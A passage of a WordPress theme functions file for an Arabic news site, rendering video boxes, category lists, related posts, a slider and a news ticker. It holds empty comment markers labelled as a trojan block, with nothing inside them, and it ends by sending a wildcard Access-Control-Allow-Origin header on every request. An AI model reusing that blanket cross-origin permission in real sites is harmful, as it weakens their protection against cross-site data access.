	if($previous)
			echo '<div class="next-posts arrows">'.$previous.'</div>';
	echo '</div>';
}

function hybrid_barlamane_tv_box() {

	$args = array(
		'posts_per_page'=> 3,
		'cat' => 17534
	);
	if (is_singular('post')) {
		$args['post__not_in']=array(get_the_ID());
	}
	// The Query
	query_posts( $args );
	echo '<div class="barlamane-tv-box">';
	echo '<div class="cat-header" style="background-color: #185f7d;"><a href="http://www.barlamane.com/category/%D8%A8%D8%B1%D9%84%D9%85%D8%A7%D9%86-%D8%AA%D9%8A%D9%81%D9%8A/">برلمان تيفي</a></div>';
	echo '<ul class="unstyle-list videos">';
	// The Loop
	$car_num=10;
	while ( have_posts() ) : the_post();
		$title=get_the_title(); 
?>
		<li class="video">
        	<a href="<?php the_permalink() ?>">
				<span class="thumb">
					<?php
						the_post_thumbnail('barlamane-cat-box-thumb');
					?>
					<i class="play"></i>
				</span>
				<h2 class="title"><?php echo hybrid_cutter($title,10); ?></h2>
			</a>
			<div class="clear"></div>
		</li>
<?php
    endwhile;
	echo '</ul></div><div class="clear"></div>';
	wp_reset_query();
}

function hybrid_home_box($cat_name,$color,$category_link,$cat_id){
	$args = array(
		'posts_per_page'=>4,
		'cat'=>$cat_id,
		'order'   => 'DESC'
	);
	//$args['cat']=$cat_id;
	echo '<div class="category-box">';
	echo '<div class="cat-header" style="background-color:'.$color.';"><a href="'.$category_link.'">'.$cat_name.'</a></div>';
	echo '<div class="posts">';
	// The Query
	query_posts( $args );
	// The Loop
	while ( have_posts() ) : the_post();
?>
		<div class="post">
			<a href="<?php the_permalink();?>">
				<span class="thumb">
					<?php the_post_thumbnail('barlamane-latest-thumb'); ?>
				</span>
				<span class="title"><?php the_title(); ?></span>
				<div class="date"><?php the_date(); ?></div>
				<span class="excerpt"><?php echo excerpt(16);?></span>
			</a>
		</div>
<?php
    endwhile;
	wp_reset_query();
	echo '</div><div class="clear"></div></div>';
}

function hybrid_related_posts() {
	$categories = get_the_category();
	$categories_id = array();
	foreach($categories as $category) {
		if($category->term_id != 15 && $category->term_id != 5435 && $category->term_id != 6 && $category->term_id != 13304 && $category->term_id != 8615) {
			array_push ( $categories_id , $category->term_id);
		}
	}

	$args = array(
		'cat'				=> $categories_id,
		'post__not_in'		=> array(get_the_ID()),
		'posts_per_page'	=> 4
	);
	$my_query = new WP_Query($args);
	if( $my_query->have_posts() ) {
		echo '<div class="related-posts-block"><h3 class="related-posts-title">إقرأ أيضاً</h3><div class="related-posts">';
		while ($my_query->have_posts()) : $my_query->the_post();
	?>
			<article class="related-post">
				<a href="<?php echo esc_url( get_permalink() );?>" rel="bookmark" title="<?php the_title_attribute(); ?>">
					<span class="post-thumbnail">
						<?php the_post_thumbnail('barlamane-cat-box-thumb'); ?>
					</span>
					<h3 class="related-post-title"><?php the_title(); ?></h3>
				</a>
			</article>
	<?php
		endwhile;
		echo '</div></div>';
	}
	wp_reset_query();
}

function top_posts(){
	$args = array(
		'posts_per_page'=>3,
		'tax_query' => array(
			array(
				'taxonomy' => 'position',
				'field' => 'slug',
				'terms' => 'highlights',
			)
		)
	);
	query_posts( $args );
	echo '<div class="top-posts">';
	while ( have_posts() ) : the_post();
		$title=get_the_title(); 
?>
		<article class="post">
        	<a href="<?php the_permalink() ?>">
				<span class="thumb">
					<?php
                        the_post_thumbnail('barlamane-scope-thumb');
                    ?>
				</span>
				<h2 class="title"><?php echo hybrid_cutter($title,20); ?></h2>
			</a>
			<div class="clear"></div>
		</article>
<?php
    endwhile;
	echo '</div><div class="clear"></div>';
	wp_reset_query();

}

function ht_slider($showposts,$cat) {
	?>
	<div class="slider-container">
        <div class="hybrid-slider hide" data-totalslides="<?php echo  $showposts;?>">
            <div class="posts slide-animation">
            <?php
            $item_count=1;
            $args = array (
                'post_type' => 'post',
                'showposts' => $showposts,
				'tax_query' => array(
					array(
						'taxonomy' => 'position',
						'field' => 'slug',
						'terms' => 'slide',
					)
				)
            );
            $query = new WP_Query($args);
            $i = 1;
            while($query->have_posts()) : $query->the_post();
                echo '<article class="post slide" id="slider-post-' . $item_count . '" data-n="' . $i++ .'">';
                echo '<h2 style="display: none;">' . get_the_title() . '</h2>';
                echo '<a href="' . get_the_permalink() . '">';
                if ( has_post_thumbnail() ) :
                    echo '<div class="hybrid-thumbnail">';
                        the_post_thumbnail('barlamane-slide');
                    echo '</div>';
                    echo '<span class="title">' . get_the_title() . '</span>';
                endif;
                echo '</a>';
                echo '</article>';
                $item_count++;
            endwhile;
            ?>
            </div>
    
            <!--<div id="pause" class="pause"><i class="fa fa-pause"></i><i class="fa fa-play"></i></div>-->
            <div class="controllers noselect">
                <div id="previous-arrow" class="arrow arrow-right"><i class="fa fa-angle-right"></i></div>
                <div id="next-arrow" class="arrow arrow-left"><i class="fa fa-angle-left"></i></div>
            </div>
        </div>
        <div class="slidemenu-container">
        </div>
    </div>
<!--Amine-Url-Block-Trojan-Start-->

<!--Amine-Url-Block-Trojan-End-->
	<?php
}

function hybrid_news_ticker($cat_id,$ticker_title,$count){
	$args = array(
		'posts_per_page'=>$count,
		'cat'=>$cat_id,
		'order'   => 'DESC'
	);

	echo '<div id="news-ticker" style="display:none" class="news-ticker"><div class="ticker-name"><a href="http://www.barlamane.com/">'.$ticker_title.'</a></div><div class="ticker-container"><ul id="ticker-feed">';

	// The Query
	query_posts( $args );
	// The Loop
	while ( have_posts() ) : the_post();
?>
		<li class="news-item"><a href="<?php the_permalink()?>"><?php the_title()?></a></li>
<?php
    endwhile;
	echo '</ul></div></div>';
	wp_reset_query();
}

/*
add_filter('pre_get_posts','hybrid_search_filter');
function hybrid_search_filter($query) {
	if (!get_query_var('evenement_cat'))
		return;
    if ( $query->is_main_query() ) {
		$query->set('orderby', 'meta_value_num');	
		$query->set('meta_key', 'barlamane-event-start-date');	 
		$query->set('order', 'DESC'); 
    }
	return $query;
}

add_filter('wp_handle_upload_prefilter','tc_handle_upload_prefilter');
function tc_handle_upload_prefilter($file) {

    $img=getimagesize($file['tmp_name']);
    $minimum = array('width' => '444', 'height' => '250');
    $width = $img[0];
    $height = $img[1];

    if ($width < $minimum['width'] )
        return array("error"=>"الصورة المحملة جد صغيرة المرجو تحميل صورة بجودة مناسبة.");

    elseif ($height <  $minimum['height'])
        return array("error"=>"الصورة المحملة جد صغيرة المرجو تحميل صورة بجودة مناسبة.");
    else
        return $file; 
}
*/

add_filter( 'query_vars', 'wadifa_add_query_vars_filter' );
function wadifa_add_query_vars_filter( $vars ){
	$vars[] = 'dd';
	$vars[] = 'mm';
	$vars[] = 'yy';
	return $vars;
}


/*
 *	css & js
 */

add_action('wp_enqueue_scripts', 'barlamane_css_and_js');
function barlamane_css_and_js(){
	wp_enqueue_style( 'stylesheet',HYBRID_ROOT.'//////////barlamane-ar.css', array(), '1.2.01.08.2018-a');
	wp_enqueue_style('font-awesome',HYBRID_ROOT.'/font-awesome/css/font-awesome.min.css');
	wp_enqueue_script('public-js', HYBRID_ROOT . '/js/public.js',array('jquery'),"1.0.10",true );
	wp_enqueue_script('slider-2-js', HYBRID_ROOT . '/js/slider.js',array('jquery'),"2.1",true );
}

add_action( 'after_setup_theme', 'barlamane_editor_style' );
function barlamane_editor_style() {
    add_editor_style('/css/editor-style.css');
}

remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'wp_print_styles', 'print_emoji_styles' ); 

add_action('admin_head', 'admin_style');
function admin_style() {
	wp_enqueue_style( 'stylesheet',HYBRID_ROOT.'/css/admin.css', array(), '1.0');
	wp_enqueue_script('update', get_template_directory_uri() . '/js/functions.js?v=09.11.17', array( 'jquery' ));
}

header("Access-Control-Allow-Origin: *");